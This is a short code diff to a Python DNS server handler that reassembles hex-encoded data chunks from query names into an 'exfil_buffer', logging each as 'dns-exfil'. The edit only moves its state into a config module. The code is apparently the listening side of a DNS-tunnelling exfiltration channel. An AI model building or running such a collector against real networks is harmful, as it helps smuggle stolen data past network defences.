@@ -9,7 +9,6 @@ import config as cfg
 class DNSHandler(socketserver.BaseRequestHandler):
     def handle(self):
         data, sock = self.request
-        global expected_chunks, exfil_buffer
         try:
             req   = DNSRecord.parse(data)
             qname = str(req.q.qname).rstrip('.')
@@ -41,11 +40,11 @@ class DNSHandler(socketserver.BaseRequestHandler):
                     seq = int(seq_s, 16)
                     tot = int(tot_s, 16)
                     chunk = binascii.unhexlify(hx)
-                    exfil_buffer[seq] = chunk
+                    cfg.exfil_buffer[seq] = chunk
 
                     # On the first chunk, remember how many we expect
-                    if expected_chunks is None:
-                        expected_chunks = tot
+                    if cfg.expected_chunks is None:
+                        cfg.expected_chunks = tot
                     print(f"📥 [dns-exfil] got chunk {seq}/{tot}")
                 except Exception as e:
                     print(f"⚠️ parse error on label {label}: {e}")
